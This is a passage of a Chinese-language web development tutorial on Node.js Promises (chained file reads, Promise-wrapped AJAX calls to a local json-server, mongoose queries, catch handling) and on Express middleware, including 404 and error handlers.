class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//resolved(解决（成功）)，rejected（驳回（失败））</span></span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolved, rejected</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//文件编码！！！！！！</span></span><br><span class="line">    fs.readFile(<span class="string">'./a.txt'</span>, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            rejected(err)</span><br><span class="line">        &#125;</span><br><span class="line">        resolved(data)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolved, rejected</span>) </span>&#123;</span><br><span class="line">    fs.readFile(<span class="string">'./b.txt'</span>, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            rejected(err)</span><br><span class="line">        &#125;</span><br><span class="line">        resolved(data)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p3 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolved, rejected</span>) </span>&#123;</span><br><span class="line">    fs.readFile(<span class="string">'c.txt'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            rejected(err)</span><br><span class="line">        &#125;</span><br><span class="line">        resolved(data)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//链式编程，🔺Promise会默认将then中return的值实例成一个promise对象，所以可以调用then方法，实现链式调用</span></span><br><span class="line">p1</span><br><span class="line">    .then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(data)</span><br><span class="line">        <span class="keyword">return</span> p2</span><br><span class="line">    &#125;)</span><br><span class="line">    .then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(data)</span><br><span class="line">        <span class="keyword">return</span> p3</span><br><span class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(data)</span><br><span class="line">    &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>then函数（ES6）说明：</p><p><img src= "/img/loading.gif" data-src="/2020/07/10/Node.JS/promise.png" alt="image-20200527214049975"></p><p>封装Promise中的<code>readFile</code>方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pReadFile = <span class="function"><span class="keyword">function</span>(<span class="params">filepath</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolved, rejected</span>) </span>&#123;</span><br><span class="line">        <span class="comment">//文件编码！！！！！！</span></span><br><span class="line">        fs.readFile(filepath, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                rejected(err)</span><br><span class="line">            &#125;</span><br><span class="line">            resolved(data)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pReadFile(<span class="string">"a.txt"</span>)</span><br><span class="line">    .then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(data)</span><br><span class="line">        <span class="keyword">return</span> pReadFile(<span class="string">"b.txt"</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    .then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(data)</span><br><span class="line">        <span class="keyword">return</span> pReadFile(<span class="string">"c.txt"</span>)</span><br><span class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(data)</span><br><span class="line">    &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><h3 id="Promise应用场景"><a href="#Promise应用场景" class="headerlink" title="Promise应用场景"></a>Promise应用场景</h3><h4 id="解决客户端回调嵌套问题"><a href="#解决客户端回调嵌套问题" class="headerlink" title="解决客户端回调嵌套问题"></a>解决客户端回调嵌套问题</h4><p>当出现类似于表关联的数据时，这时候就会遇到嵌套问题，当嵌套的数据只有一两个个还好，如果出现三四个甚至五六个，这时候就会出现回调地狱的问题，这里使用promise解决</p><h5 id="所需知识："><a href="#所需知识：" class="headerlink" title="所需知识："></a>所需知识：</h5><ol><li>npm模块：json-server、http-server</li><li>客户端模板引擎art-template</li><li>Ajax</li><li>jquery</li></ol><h5 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h5><ol><li><p>安装json-server和http-server以及其他必要模块</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm i <span class="literal">-g</span> http<span class="literal">-server</span></span><br><span class="line">npm i <span class="literal">-g</span> json<span class="literal">-server</span></span><br><span class="line">npm i jquery -<span class="literal">-save</span></span><br><span class="line">npm i template -<span class="literal">-save</span></span><br></pre></td></tr></table></figure></li><li><p>建立html页面</p></li><li><p>设计表单，人员信息与工作职业相关联，搭配模板字符串使用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">"user_form"</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/template"</span> <span class="attr">id</span>=<span class="string">"tpl"</span>&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">""</span>&gt;</span>用户名<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123; user.username &#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">""</span>&gt;</span>年龄<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123; user.age &#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">""</span>&gt;</span>职业<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">""</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        </span><span class="template-variable">&#123;&#123; <span class="builtin-name">each</span> jobs &#125;&#125;</span><span class="xml"> </span><span class="template-variable">&#123;&#123; <span class="builtin-name">if</span> user.job === $value.id &#125;&#125;</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123; $value.id &#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">selected</span>&gt;</span></span><span class="template-variable">&#123;&#123; $value.name &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        </span><span class="template-variable">&#123;&#123; <span class="builtin-name">else</span> &#125;&#125;</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123; $value.id &#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span><span class="template-variable">&#123;&#123; $value.name &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        </span><span class="template-variable">&#123;&#123; /<span class="builtin-name">if</span> &#125;&#125;</span><span class="xml"> </span><span class="template-variable">&#123;&#123; /<span class="builtin-name">each</span> &#125;&#125;</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>引用相关模板字符串以及JQuery模块</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"node_modules/art-template/lib/template-web.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"node_modules/jquery/dist/jquery.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>书写Ajax向服务器发起请求,并封装便于使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">url, callback</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> oReq = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">      oReq.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">oReq.responseText</span><br><span class="line">        callback(oReq.responseText)</span><br><span class="line">      &#125;</span><br><span class="line">      oReq.open(<span class="string">"get"</span>, url, <span class="literal">true</span>)</span><br><span class="line">      oReq.send()</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>开启json-server服务，使用data.json文件（67步使用cmd）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">json<span class="literal">-server</span> data.json</span><br></pre></td></tr></table></figure></li><li><p>将当前文件所处文件夹开放为服务器</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http<span class="literal">-server</span></span><br></pre></td></tr></table></figure><ul><li>若要禁用缓存，则使用以下命令</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http<span class="literal">-server</span> <span class="literal">-c</span><span class="literal">-1</span></span><br></pre></td></tr></table></figure></li><li><p>若采用回调地狱类型</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">get</span>("http://127.0.0.1:3000/users/1",function(userData)&#123;</span><br><span class="line">  <span class="keyword">get</span>("http://127.0.0.1:3000/jobs",function(jobsData)&#123;</span><br><span class="line">  <span class="keyword">var</span> htmlStr = template(<span class="string">"tpl"</span>, &#123;</span><br><span class="line">  user: <span class="built_in">JSON</span>.parse(userData),</span><br><span class="line">  jobs: <span class="built_in">JSON</span>.parse(jobsData)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="built_in">console</span>.log(htmlStr)</span><br><span class="line">  <span class="built_in">document</span>.querySelector(<span class="string">"#user_form"</span>).innerHTML = htmlStr</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>使用Jquery版的Promise</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Jquery的Ajax自带promise</span></span><br><span class="line"><span class="keyword">var</span> data = &#123;&#125;</span><br><span class="line">$.<span class="keyword">get</span>("http://127.0.0.1:3000/users/2")</span><br><span class="line"> .then(function(user)&#123;</span><br><span class="line">   data.user = user</span><br><span class="line">   <span class="keyword">return</span> $.<span class="keyword">get</span>("http://127.0.0.1:3000/jobs")</span><br><span class="line"> &#125;)</span><br><span class="line"> .then(function(jobs)&#123;</span><br><span class="line">   data.jobs = jobs</span><br><span class="line">   <span class="comment">// console.log(data)</span></span><br><span class="line">   <span class="keyword">var</span> str = template(<span class="string">"tpl"</span>,&#123;</span><br><span class="line">      user: data.user,</span><br><span class="line">      jobs: data.jobs</span><br><span class="line">    &#125;)</span><br><span class="line">   <span class="built_in">document</span>.querySelector(<span class="string">'#user_form'</span>).innerHTML = str</span><br><span class="line"> &#125;)</span><br></pre></td></tr></table></figure></li><li><p>封装Promise版本的AJAX方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Rget</span>(<span class="params">url,callback</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve,reject</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">  <span class="comment">// 当请求加载成功之后要调用指定的函数</span></span><br><span class="line">  xhr.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 我现在需要得到这里的 xhr.responseText</span></span><br><span class="line">    resolve(<span class="built_in">JSON</span>.parse(xhr.responseText))</span><br><span class="line">    callback &amp;&amp; callback(<span class="built_in">JSON</span>.parse(xhr.responseText))</span><br><span class="line">  &#125;</span><br><span class="line">  xhr.onerror = <span class="function"><span class="keyword">function</span> (<span class="params">err</span>)</span>&#123;</span><br><span class="line">    reject(err)</span><br><span class="line">  &#125;</span><br><span class="line">  xhr.open(<span class="string">"get"</span>, url, <span class="literal">true</span>)</span><br><span class="line">  xhr.send()</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>使用</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = &#123;&#125;</span><br><span class="line">Rget(<span class="string">"http://127.0.0.1:3000/users/2"</span>)</span><br><span class="line"> .then(<span class="function"><span class="keyword">function</span>(<span class="params">user</span>)</span>&#123;</span><br><span class="line">    data.user = user</span><br><span class="line">    <span class="keyword">return</span> Rget(<span class="string">"http://127.0.0.1:3000/jobs"</span>)</span><br><span class="line"> &#125;)</span><br><span class="line"> .then(<span class="function"><span class="keyword">function</span>(<span class="params">jobs</span>)</span>&#123;</span><br><span class="line">    data.jobs = jobs</span><br><span class="line">    <span class="keyword">var</span> str = template(<span class="string">"tpl"</span>, &#123;</span><br><span class="line">      user: data.user,</span><br><span class="line">      jobs: data.jobs</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="built_in">document</span>.querySelector(<span class="string">"#user_form"</span>).innerHTML = str</span><br><span class="line"> &#125;)</span><br></pre></td></tr></table></figure></li></ol><h4 id="Promise操作数据库"><a href="#Promise操作数据库" class="headerlink" title="Promise操作数据库"></a>Promise操作数据库</h4><p>（26-Promise，Promise操作数据库）</p><ul><li>mongoose中所有的API都支持promise</li></ul><p>🔺根据查询是否已存在该记录从而决定是否创建新记录</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Cat.findOne(&#123; <span class="attr">name</span>: <span class="string">"好啊"</span> &#125;)</span><br><span class="line">    .then(<span class="function"><span class="keyword">function</span>(<span class="params">cat</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(cat)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'该cat已存在'</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Cat(&#123;<span class="string">"name"</span> : <span class="string">"好啊"</span>, <span class="string">"age"</span> : <span class="number">16</span> &#125;).save()</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    .then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><ol><li>每次改完js或html文件后在浏览器需刷新多次</li><li>每次改完json文件后需要重新启动json-server服务</li></ol><h3 id="catch异常处理"><a href="#catch异常处理" class="headerlink" title="catch异常处理"></a>catch异常处理</h3><p>在全部then之后添加<code>.catch(err =&gt; {})</code>即可对任何一个then处理过程抛出的异常进行捕获并中止代码继续执行</p><p>例如：读取文件并进行后续相关操作，若处理过程发生一个错误则传递给catch，后面所有的then就不再执行</p><p>这里要注意区分，如果是在<code>then</code>中自行处理<code>err</code>，则代码还是会继续往下执行，这是和<code>catch</code>不同的点</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">readFile(<span class="string">'a.txt'</span>, <span class="string">'utf8'</span>)</span><br><span class="line">  .then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data)</span><br><span class="line">    <span class="keyword">return</span> readFile(<span class="string">'a.txt'</span>, <span class="string">'utf8'</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  .then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data)</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><h1 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h1><p>案例：案例5论坛</p><h2 id="中间件的概念"><a href="#中间件的概念" class="headerlink" title="中间件的概念"></a>中间件的概念</h2><blockquote><p>参考文档：<a href="http://expressjs.com/en/guide/using-middleware.html" target="_blank" rel="noopener">http://expressjs.com/en/guide/using-middleware.html</a></p></blockquote><p>中间件：把很复杂的事情分割成单个，然后依次有条理的执行。就是一个中间处理环节，有输入，有输出。</p><p>说的通俗易懂点儿，中间件就是一个（从请求到响应调用的方法）方法。</p><p>把数据从请求到响应分步骤来处理，每一个步骤都是一个中间处理环节。</p><p>形象化如这个图：自来水厂的净水过程</p><p><img src= "/img/loading.gif" data-src="/2020/07/10/Node.JS/OIP-C.jpg" alt="自来水"></p><p>同一个请求对象所经过的中间件都是同一个请求对象和响应对象。</p><h2 id="中间件的分类"><a href="#中间件的分类" class="headerlink" title="中间件的分类:"></a>中间件的分类:</h2><h3 id="应用程序级别的中间件"><a href="#应用程序级别的中间件" class="headerlink" title="应用程序级别的中间件"></a>应用程序级别的中间件</h3><p>万能匹配（不关心任何请求路径和请求方法的中间件）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Time'</span>,<span class="built_in">Date</span>.now());</span><br><span class="line">    next();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>关心请求路径和请求方法的中间件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="string">'/a'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Time'</span>,<span class="built_in">Date</span>.now());</span><br><span class="line">    next();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="路由级别的中间件"><a href="#路由级别的中间件" class="headerlink" title="路由级别的中间件"></a>路由级别的中间件</h3><p>严格匹配请求路径和请求方法的中间件</p><p>get:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">res.send(<span class="string">'get'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>post：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">'/a'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">res.send(<span class="string">'post'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>put:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.put(<span class="string">'/user'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">res.send(<span class="string">'put'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>delete:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.delete(<span class="string">'/delete'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">res.send(<span class="string">'delete'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="Express的中间件"><a href="#Express的中间件" class="headerlink" title="Express的中间件"></a>Express的中间件</h2><p>在 <code>Express</code> 中，对中间件有几种分类</p><ul><li><p>当请求进来，会从第一个中间件开始进行匹配</p><ul><li>如果匹配，则进来<pre><code>如果请求进入中间件之后，没有调用 `next` 则代码会停在当前中间件如果调用了 `next` 则继续向后找到第一个匹配的中间件</code></pre></li><li>如果不匹配，则继续判断匹配下一个中间件</li></ul></li><li><p>不关心请求路径和请求方法的中间件，也就是说任何请求都会进入这个中间件</p></li><li><p>中间件本身是一个方法，该方法接收三个参数：</p><ul><li><code>Request</code> 请求对象</li><li><code>Response</code> 响应对象</li><li><code>next</code> 下一个中间件</li><li>当一个请求进入一个中间件之后，如果不调用 next 则会停留在当前中间件<br>所以 next 是一个方法，用来调用下一个中间件的<br>调用 next 方法也是要匹配的（不是调用紧挨着的那个）</li></ul></li></ul><h2 id="错误处理中间件"><a href="#错误处理中间件" class="headerlink" title="错误处理中间件"></a>错误处理中间件</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">err,req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.error(err,stack);</span><br><span class="line">    res.status(<span class="number">500</span>).send(<span class="string">'Something broke'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>配置使用404中间件：（论坛案例）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.render(<span class="string">'404.html'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>配置全局错误处理中间件:  (论坛案例）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 